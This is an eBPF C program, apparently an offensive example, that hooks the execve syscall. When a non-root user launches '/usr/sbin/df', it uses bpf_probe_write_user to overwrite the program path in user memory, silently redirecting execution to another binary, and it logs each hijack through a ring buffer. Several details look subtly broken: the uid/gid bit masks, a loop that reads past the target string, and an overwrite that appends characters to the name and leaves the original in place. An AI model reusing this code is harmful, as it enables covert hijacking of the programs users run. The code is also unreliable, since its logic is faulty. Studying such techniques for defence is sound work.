// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
	__uint(type, BPF_MAP_TYPE_RINGBUF);
	__uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Optional Target Parent PID
const volatile int target_ppid = 0;

SEC("tp/syscalls/sys_enter_execve")
int handle_execve_enter(struct trace_event_raw_sys_enter *ctx)
{
	size_t pid_tgid = bpf_get_current_pid_tgid();
	u64 uid_gid = bpf_get_current_uid_gid();
	u32 uid = 0x0000FFFF & uid_gid;
	u32 gid = (0xFFFF0000 & uid_gid) >> 32;

	if (uid_gid == 0x00000000) {
		bpf_printk("[EXECVE_HIJACK] skip hijack root user\n");
		return 0;
	}

	// Read in program from first arg of execve
	char prog_name[TASK_COMM_LEN];
	char prog_name_orig[TASK_COMM_LEN];
	__builtin_memset(prog_name, '\x00', TASK_COMM_LEN);
	bpf_probe_read_user(&prog_name, TASK_COMM_LEN, (void *)ctx->args[0]);
	bpf_probe_read_user(&prog_name_orig, TASK_COMM_LEN,
			    (void *)ctx->args[0]);
	prog_name[TASK_COMM_LEN - 1] = '\x00';

	// Program can't be less than out two-char name
	if (prog_name[1] == '\x00') {
		bpf_printk("[EXECVE_HIJACK] program name too small\n");
		return 0;
	}

	const char *target = "/usr/sbin/df";
	for (int i = 0; i < TASK_COMM_LEN - 1; i++) {
		if (target[i] != prog_name[i]) {
			return 0;
		}
	}

	// Attempt to overwrite with hijacked binary path
	prog_name[TASK_COMM_LEN - 4] = 'l';
	prog_name[TASK_COMM_LEN - 3] = 's';
	for (int i = TASK_COMM_LEN - 2; i < TASK_COMM_LEN; i++) {
		prog_name[i] = '\x00';
	}
	bpf_printk("[EXECVE_HIJACK] %s\n", prog_name);
	long ret = bpf_probe_write_user((void *)ctx->args[0], &prog_name,
					TASK_COMM_LEN);

	// Send an event
	struct event *e;
	e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
	if (e) {
		e->success = (ret == 0);
		e->pid = (pid_tgid >> 32);
		for (int i = 0; i < TASK_COMM_LEN; i++) {
			e->comm[i] = prog_name_orig[i];
		}
		bpf_ringbuf_submit(e, 0);
	}

	return 0;
}
